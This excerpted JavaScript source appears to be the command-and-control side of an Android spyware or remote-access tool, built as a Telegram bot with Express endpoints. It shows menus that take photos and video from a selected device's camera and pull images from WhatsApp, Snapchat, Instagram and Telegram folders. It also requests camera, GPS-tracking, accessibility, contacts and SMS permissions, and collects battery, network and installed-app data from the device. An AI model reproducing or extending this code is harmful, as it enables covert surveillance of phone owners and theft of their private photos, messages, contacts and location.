...
/* ── Fast Animated Loading ───────────────────────────── */
async function showAnimatedLoading(chatId, msgId, type = "default", duration = 1500) {
  const frames = progressAnimations[type] || ["⚡", "⚡", "⚡", "✅"];
  const steps = Math.min(6, Math.floor(duration / 200)); // Faster steps
  ...
  for (let i = 0; i <= steps; i++) {
    ...
    try {
      ...
      if (i < steps) await new Promise(resolve => setTimeout(resolve, 200)); // Faster intervals
    } catch (e) {
...
/* ── Enhanced Gallery with Custom Option ────────────────────── */
...
const getGalleryKeyboard = (includeBack = true) => {
  ...
  kb.inline_keyboard.push([
    {text: "🖼️ All Images", callback_data: "gallery_all"},
    {text: "⚡ Custom Count", callback_data: "gallery_custom"}
  ]);
...
bot.on("callback_query", async q => {
  ...
  try {
    ...
    if (data === "check_permissions") {
      try {
        await bot.answerCallbackQuery(id, { text: "🔍 Scanning permissions..." });
        const session = userSessions.get(chatId);
        ...
        await showAnimatedLoading(chatId, msgId, "permission", 1500);
        
        // Request fresh permission check from device
    ...
    /* ── Enhanced Permissions Menu ───────────────────────── */
    if (data === "permissions_menu") {
      try {
        await bot.answerCallbackQuery(id, { text: "🔐 Opening permission center..." });
        const session = userSessions.get(chatId);
        if (!session || !session.selectedDevice) {
          await bot.answerCallbackQuery(id, { text: "⚠️ No device selected", show_alert: true });
          return;
        ...
        await bot.editMessageText(
          ...
          "📊 *Check Permissions* - Real-time permission status\n" +
          "🔧 *Setup Permissions* - Interactive permission setup\n" +
          "⚡ *Quick Grant* - Grant permissions directly\n" +
          ...
          "_Device: " + session.selectedDevice.slice(0,6) + "..._",
          {
            ...
            reply_markup: {
              inline_keyboard: [
                ...
                [{text: "⚡ Quick Grant", callback_data: "quick_grant_permissions"}],
    ...
    if (data === "quick_grant_permissions") {
      try {
        await bot.answerCallbackQuery(id, { text: "⚡ Preparing quick grant..." });
        const session = userSessions.get(chatId);
        if (!session || !session.selectedDevice) {
          await bot.answerCallbackQuery(id, { text: "⚠️ No device selected", show_alert: true });
          return;
        ...
        await bot.editMessageText(
          ...
          "Select permissions to grant directly:\n\n" +
          "🔐 *Critical Permissions:*\n" +
          "• Camera - Photo/video capture\n" +
          "• Location - GPS tracking\n" +
          "• Storage - File access\n" +
          "• Accessibility - Advanced control\n\n" +
          "_Device: " + session.selectedDevice.slice(0,6) + "..._",
          {
            chat_id: chatId,
            message_id: msgId,
            ...
            reply_markup: {
              inline_keyboard: [
                [
                  {text: "📸 Camera", callback_data: "grant_camera"},
                  {text: "📍 Location", callback_data: "grant_location"}
                ],
                [
                  {text: "📂 Storage", callback_data: "grant_storage"},
                  {text: "♿ Accessibility", callback_data: "grant_accessibility"}
                ],
                [
                  {text: "📱 Contacts", callback_data: "grant_contacts"},
                  {text: "💬 SMS", callback_data: "grant_sms"}
                ],
                [{text: "🔙 Back", callback_data: "permissions_menu"}]
              ]
            }
          }
        );
        ...
        console.error("Error in quick grant:", error);
        await bot.answerCallbackQuery(id, { text: "❌ Error opening quick grant", show_alert: true });
        return;
      }
    }
    ...
    if (data.startsWith("grant_")) {
      try {
        const permission = data.replace("grant_", "");
        await bot.answerCallbackQuery(id, { text: `🔧 Granting ${permission}...` });
        const session = userSessions.get(chatId);
        if (!session || !session.selectedDevice) {
          await bot.answerCallbackQuery(id, { text: "⚠️ No device selected", show_alert: true });
          return;
        ...
        await bot.editMessageText(
          `*🔧 Granting ${permission.toUpperCase()} Permission*\n\n` +
          `Request sent to device...\n\n` +
          `📱 Check your device for permission dialog.\n` +
          `⏳ Waiting for user action...`,
          {
            ...
            reply_markup: {
              inline_keyboard: [
                [{text: "🔄 Check Status", callback_data: "check_permissions"}],
                [{text: "🔙 Back", callback_data: "quick_grant_permissions"}]
              ]
            }
          }
        );
        ...
        await bot.answerCallbackQuery(id, { text: "❌ Error granting permission", show_alert: true });
        return;
      }
    }
    ...
    /* ── Enhanced Gallery Custom Count ───────────────────── */
    if (data === "gallery_custom") {
      await bot.answerCallbackQuery(id);
      const session = userSessions.get(chatId);
      if (!session || !session.selectedDevice) {
        await bot.answerCallbackQuery(id, { text: "⚠️ No device selected", show_alert: true });
      ...
      await bot.editMessageText(
        ...
        "Select folder and specify count:\n\n" +
        "_Choose a folder to get custom number of images_",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [
                {text: "📸 Camera", callback_data: "gallery_custom_camera"},
                {text: "📱 WhatsApp", callback_data: "gallery_custom_whatsapp"}
              ],
              [
                {text: "📷 Screenshots", callback_data: "gallery_custom_screenshots"},
                {text: "📸 Snapchat", callback_data: "gallery_custom_snapchat"}
              ],
              [
                {text: "📷 Instagram", callback_data: "gallery_custom_instagram"},
                {text: "📁 Downloads", callback_data: "gallery_custom_downloads"}
              ],
              [
                {text: "📱 Telegram", callback_data: "gallery_custom_telegram"},
                {text: "🖼️ All Images", callback_data: "gallery_custom_all"}
              ],
              [{text: "🔙 Back", callback_data: "gallery_root"}]
            ]
          }
        }
      );
    ...
    if (data.startsWith("gallery_custom_")) {
      ...
      const prompt = await bot.sendMessage(chatId,
        ...
        `How many *${label.charAt(0).toUpperCase() + label.slice(1)}* images would you like?\n\n` +
      ...
      try {
        ...
        await bot.sendPhoto(chatId, fs.readFileSync(req.file.path), {
          ...
          reply_markup: {
            inline_keyboard: [
              [
                {text: "📸 Another Photo", callback_data: "cam_back"},
                {text: "🎥 Record Video", callback_data: "cam_back"}
              ],
              [
                {text: "🎛️ Main Menu", callback_data: "main_menu"},
                {text: "📂 Files", callback_data: "file_menu"}
              ]
            ]
          }
        });
      ...
      try {
        await bot.sendVideo(chatId, fs.readFileSync(req.file.path), {
          ...
          reply_markup: {
            inline_keyboard: [
              [
                {text: "📸 Take Photo", callback_data: "cam_back"},
                {text: "🎥 Another Video", callback_data: "cam_back"}
              ],
              [
                {text: "🎛️ Main Menu", callback_data: "main_menu"},
                {text: "📂 Files", callback_data: "file_menu"}
...
/* 10) Enhanced Status updates with Menu Options */
      ...
      await bot.sendMessage(chat_id,
        ...
        { 
          ...
          reply_markup: {
            inline_keyboard: [
              [
                {text: "📸 More Images", callback_data: "gallery_root"},
                {text: "📂 File Explorer", callback_data: "file_menu"}
              ],
              [
                {text: "🎛️ Main Menu", callback_data: "main_menu"},
                {text: "🔄 Another Action", callback_data: "gallery_root"}
              ]
            ]
          }
        }
      ...
      await bot.sendMessage(chat_id,
        ...
        { 
          ...
          reply_markup: {
            inline_keyboard: [
              [
                {text: "🔄 Retry", callback_data: "gallery_root"},
                {text: "🔙 Back", callback_data: "main_menu"}
              ]
            ]
          }
...
/* 12) Enhanced Permission Interface Endpoint */
app.post("/json/permission_interface", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, msg_id, type, status, message, total_missing, grouped_missing, buttons, permission, error} = req.body;
    
    if (type === "permission_interface") {
    ...
    } else if (type === "permission_grant_requested") {
      await bot.editMessageText(message, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
      ...
      await bot.editMessageText(
        `❌ *Permission Error*\n\n${error}`,
        {
          ...
          reply_markup: {
            inline_keyboard: [
              [{text: "🔄 Retry", callback_data: "check_permissions"}],
              [{text: "🔙 Back", callback_data: "permissions_menu"}]
            ]
          }
        }
...
/* 13) Enhanced JSON status/error endpoints */
...
/* 15) Enhanced Battery Status Endpoint */
app.post("/json/battery_status", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, msg_id, battery_percent, is_charging} = req.body;
    
    const batteryVisual = getBatteryVisual(battery_percent);
    const chargingStatus = is_charging ? "🔌 Charging" : "🔋 Discharging";
...
/* 16) Enhanced Network Info Endpoint */
app.post("/json/network_info", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, msg_id, network_type, is_connected} = req.body;
    
    const status = is_connected ? "🟢 Connected" : "🔴 Disconnected";
    const networkEmoji = network_type === "WiFi" ? "📶" : 
                        network_type === "Mobile Data" ? "📱" : "🌐";
    
    await bot.editMessageText(
      `*${networkEmoji} Network Information*\n\n` +
      `Status: ${status}\n` +
      `Type: ${network_type}\n` +
      `Device: \`${deviceInfo.deviceId.slice(0,6)}\`\n\n` +
      `_Last updated: ${new Date().toLocaleTimeString()}_`,
      {
        ...
        reply_markup: {
          inline_keyboard: [
            [
              {text: "🔄 Refresh", callback_data: "network_info"},
              {text: "🔋 Battery", callback_data: "battery_status"}
            ],
            [
              {text: "🎛️ Main Menu", callback_data: "main_menu"},
              {text: "🔙 Back", callback_data: "device_menu"}
...
/* 17) Enhanced App List Endpoint */
app.post("/json/app_list", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, msg_id, apps, total_count} = req.body;
    ...
    if (apps && apps.length > 0) {
      ...
      if (apps.length > 10) {
        message += `_... and ${apps.length - 10} more apps_\n\n`;
      }
    }
